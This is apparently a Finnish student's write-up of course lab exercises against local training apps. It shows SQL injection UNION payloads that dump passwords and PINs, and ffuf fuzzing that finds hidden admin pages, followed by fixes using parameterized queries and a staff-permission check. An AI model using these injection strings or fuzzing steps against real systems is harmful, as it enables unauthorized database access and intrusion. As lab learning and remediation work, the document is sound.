# H2 Break & unbreak
## Ympäristö
- Windows 11 PC
- VMware Workstation Pro 17
- [Kali Linux VMware image](https://www.kali.org/get-kali/#kali-virtual-machines)
- Memory - 2 GB
- Processors - 4
- Hard Disk - 80 GB
- Network - NAT
## x)
 - **ffuf** on fuzzing-työkalu, jolla on mahdollista testata web-sovelluksia etsimällä muun muassa piilotettuja sivuja.
 - **SQL-injektio** on hyökkäys, jossa hyökkääjä lähettää muokattuja SQL-pyyntöjä ohjelmistoon, mikä mahdollistaa tietokannan katselmoinnin ja manipuloinnin.
 - **Access control** tarkoittaa web-kehityksessä autentikoinnin, istunnon hallinnoinnin ja käyttäjäoikeuksien rajoitusten kokonaisuutta.

## a) Murtaudu 010-staff-only. Hack'n Fix
### Tehtävän alustus
Aloitetaan lataamalla tehtävät:
```bash
wget https://terokarvinen.com/hack-n-fix/teros-challenges.zip
unzip teros-challenges.zip
```
Siirrytään kansioon ja käynnistetään tehtävän verkkosivu:
```bash
cd challenges/010-staff-only/
python3 staff-only.py
```
![part1](/kuvat/staff-only1.png)
### Ratkaisu
 - Avataan sivu verkkoselaimessa, esim. Mozilla Firefox http://127.0.0.1:5000/
 - Avataan Element picker **Ctrl+Shift+C**
 - Tutkimalla verkkosivua huomataan, että pinkoodien takana oleva lomake vaatii **numeroita!**
 - Ei hätää, vaatimuksen voi vain poistaa **web developer toolsissa**

 ![part2](/kuvat/staff-only2.png)
 - Tämän jälkeen lomakkeesta voi lähettää merkkijonon!
 - Luin tehtävää varten [PortSwiggeristä](https://portswigger.net/web-security/sql-injection/union-attacks) artikkelin **UNION**-hyökkäyksistä, joiden avulla voidaan SQL-injektiossa lähettää toinen haku SQL-tietokantaan.
 - Piippu-operaattorilla || saadaan lisämausteena korkattua myös pinkoodit salasanojen kanssa  
 ```
 ' UNION SELECT password || '~' || pin FROM pins --
 ```
- Your password is **SUPERADMIN%%rootALL-FLAG{Tero-e45f8764675e4463db969473b6d0fcdd}~11112222333**
- Lisäämällä **LIMIT**-operaattori voidaan käydä tietokantaa läpi
```
' UNION SELECT password || '~' || pin FROM pins LIMIT 2,1 --
```
-  foo~321
-  loremipsum~321


## b) Korjaa 010-staff-only haavoittuvuus lähdekoodista. Osoita testillä, että ratkaisusi toimii.
 ```bash
 cd challenges/010-staff-only
 micro staff-only.py
 ```
 ![f010-1](/kuvat/f010-1.png)
 - Koodista huomataan, että käyttäjän lähettämä syöte liitetään suoraan SQL-pyynnön merkkijonoon.
 - SQL-injektioita torjuakseen tulisi aina käyttää parametrisoituja hakuja.
 - Korjataan virhe hyödyntämällä SQLAlchemyn **text**-metodia, jota on jo käytetty ohjelmassa.

 ![f010-3](/kuvat/f010-3.png)
### Testaus
 - Testasin UNION-hyökkäystä ja vilpitöntä syötettä, ja ohjelma toimi toivotusti.

![f010-2](/kuvat/f010-2.png)
 
## c) Ratkaise dirfuzt-1 artikkelista Karvinen 2023: Find Hidden Web Directories - Fuzz URLs with ffuf.
### Tehtävän alustus
 - Avaa terminaali ja lataa tehtävä:
```bash
wget https://terokarvinen.com/2023/fuzz-urls-find-hidden-directories/dirfuzt-0
chmod 744 dirfuzt-0
./dirfuzt-0
```
 - Seuraavaksi ladataan lista merkkijonoja, joita ffuf voi käydä läpi:

 ```bash
 wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt
 ```

 - Avataan uusi terminaali, jossa käytämme ffuf-työkalua, joka toimitetaan nykyään Kali Linuxin mukana.
 - "-w"-operaattorilla tarjotaan ffufferille lista sanoja (tässä tapauksessa common.txt).
 - "-u"-operaattorilla taas tarjotaan URL, mistä ohjelma tutkii sivuja muuttujan avulla FUZZ.
 - ffuf siis korvaa muuttujan FUZZ arvon jokaista common.txt-merkkijonoa kohden.

 ```bash
 ffuf -w common.txt -u http://127.0.0.2:8000/FUZZ
 ```
![ffuf1](/kuvat/ffuf1.png)
 - ffuf on tulostanut kaikki 4750 vaihtoehtoa, ja huomataan tulosteissa yhtäläisyyksiä.
 - Käydään tarkistamassa muutama URL: http://127.0.0.2:8000/.env ja http://127.0.0.2:8000/.git

 ![ffuf2](/kuvat/ffuf2.png)
 - Sivut ovat samankaltaisia.
 - ffufilla voidaan suodattaa tuloksia eri operaattoreilla. Käytämme seuraavaksi "-fs" (filter size) -operaattoria suodattamalla pois kaikki sivut, joiden merkkikoko on **132**.
 ```bash
  ffuf -w common.txt -u http://127.0.0.2:8000/FUZZ -fs 132
 ```
 - Täten saadaan huomattavasti tiiviimpi tuloste.

 ![ffuf3](/kuvat/ffuf3.png)
 - Huomataan, että URLissa http://127.0.0.2:8000/admin löytyi sivu, jossa on 160 merkkiä. Käydään katsomassa.
 
 ![ffuf4](/kuvat/ffuf4.png)


## d) Murtaudu 020-your-eyes-only. Hack'n Fix
### Tehtävän alustus
 - Avataan tehtävä ja ladataan virtualenv:
 ```bash
 cd ~
 cd challenges/020-your-eyes-only/
 sudo apt-get -y install virtualenv
 virtualenv virtualenv/ -p python3 --system-site-packages
 ```
 - Aktivoidaan virtualenv:
 ```bash
 source virtualenv/bin/activate
 ```
 - Ladataan Django, minkä avulla tehtävän sivusto pyörii:
 ```bash
cat requirements.txt
pip install -r requirements.txt
 ```
 - Alustetaan tietokanta ja käynnistetään Django:
 ```bash
  cd logtin/
  ./manage.py makemigrations; ./manage.py migrate
  ./manage.py runserver
 ```
 ![020-1](/kuvat/020-1.png)

 - Käydään katsomassa, miltä sivusto näyttää.
 
 ![020-2](/kuvat/020-2.png)

 ### Tehtävän ratkaisu
  - Avataan uusi terminaali ja hyödynnetään ffufia kuten edellisessä tehtävässä.
  ```bash
   ffuf -w common.txt -u http://127.0.0.1:8000/FUZZ
  ```
  ![020-3](/kuvat/020-3.png)
  - ffuf löysi /admin-console -päätteisen sivun, käydään katsomassa.

  ![020-4](/kuvat/020-4.png)
## e) Korjaa 020-your-eyes-only haavoittuvuus. Osoita testillä, että ratkaisusi toimii.
 ```bash
 cd challenges/020-your-eyes-only/logtin/hats
 micro views.py
 ```
 - Riviltä 20 puuttui tarkistus, jolla tarkistetaan sivua katselmoivan käyttäjän is_staff-parametri.
 - Tehdään korjaus.

 ![f020-1](/kuvat/f020-1.png)
 - Kävin vielä testaamassa, voiko sivua katselmoida korjauksen jälkeen.

 ![f020-2](/kuvat/f020-2.png)

## Lähteet
1. danielmiessler 2025. SecLists. Luettavissa: https://github.com/danielmiessler/SecLists
2. fuzz faster you fool. Luettavissa  https://github.com/ffuf/ffuf
3. kali virtual machines. Luettavissa https://www.kali.org/get-kali/#kali-virtual-machines
4. PortSwigger Ltd. UNION attacks. Luettavissa: https://portswigger.net/web-security/sql-injection/union-attacks
5. Tero Karvinen 2023. Find Hidden Web Directories - Fuzz URLs with ffuf. Luettavissa: https://terokarvinen.com/2023/fuzz-urls-find-hidden-directories/
6. Tero Karvinen 2024. Hack'n Fix. Luettavissa: https://terokarvinen.com/hack-n-fix/